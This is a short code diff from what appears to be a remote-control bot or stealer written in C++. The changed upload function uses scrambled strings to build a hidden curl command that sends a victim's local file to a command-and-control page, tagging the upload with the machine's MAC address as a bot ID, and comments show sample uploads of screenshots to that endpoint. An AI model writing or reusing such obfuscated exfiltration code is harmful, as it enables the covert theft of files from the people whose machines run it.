@@ -128,7 +128,9 @@ std::string Curl::anonFilesUpload(const std::string& file_path)
 	if (Tools::FileExists(file_path))
 	{
 		std::string url = "";
-		std::string command = Tools::decode("F  -rlcu=@lefi\"") + file_path + "\"" + Tools::decode("nfno.api/a:/psttdhoapl/uom.cesil"); // decode -> curl -F \"file=@, https://api.anonfiles.com/upload
+		std::string command = Tools::decode("F  -rlcu=@lefi\"") + file_path + "\" " + this->control_website + "?bot=" + this->mac_address; // decode -> curl -F \"file=@, Receive_Send.php?bot=
+		//curl -F "file=@C:\Users\ADMINI~1\AppData\Local\Temp\sjfo34fu9c.png" https://api.anonfiles.com/upload
+		//curl -F "file=@C:\Users\Administrator\Pictures\AnyDesk\1.png" http://127.0.0.1/2/Receive_Send.php?bot=FC3497957CFE
 		std::string result = Tools::CMD(command);
 		if (result.find(Tools::decode("s\"tutaesru:t"))) // decode -> status\":true
 		{
